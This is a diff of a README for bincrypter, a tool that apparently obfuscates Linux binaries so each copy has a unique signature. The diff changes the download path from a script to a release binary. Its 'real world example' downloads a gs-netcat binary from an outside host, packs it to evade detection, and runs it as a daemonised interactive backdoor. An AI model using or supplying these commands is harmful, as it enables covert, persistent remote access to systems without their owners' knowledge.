@@ -14,14 +14,14 @@
 
 Download:
 ```shell
-curl -SsfL https://github.com/hackerschoice/bincrypter/raw/refs/heads/main/bincrypter.sh -o bincrypter.sh
-chmod +x bincrypter.sh
+curl -SsfL https://github.com/hackerschoice/bincrypter/releases/latest/download/bincrypter -o bincrypter
+chmod +x bincrypter
 ```
 
 Example:
 ```shell
 cp /usr/bin/id id
-./bincrypter.sh id
+./bincrypter id
 # Compressed: 68552 --> 24176 [35%]
 
 ./id
@@ -31,7 +31,7 @@ cp /usr/bin/id id
 Set a custom PASSWORD (optionally):
 ```shell
 cp /usr/bin/id id
-./bincrypter.sh id foobar
+./bincrypter id foobar
 # Compressed: 68552 --> 23860 [34%]
 
 ./id
@@ -41,7 +41,7 @@ cp /usr/bin/id id
 
 Real world example (install a backdoor with a unique signature):
 ```shell
-curl -SsfL "https://gsocket.io/bin/gs-netcat_mini-linux-$(uname -m)" | PASSWORD="foobar" ./bincrypter.sh >gsnc
+curl -SsfL "https://gsocket.io/bin/gs-netcat_mini-linux-$(uname -m)" | PASSWORD="foobar" ./bincrypter >gsnc
 chmod +x gsnc
 PASSWORD="foobar" GS_ARGS="-ilD -s ChangeMe" ./gsnc
 ```
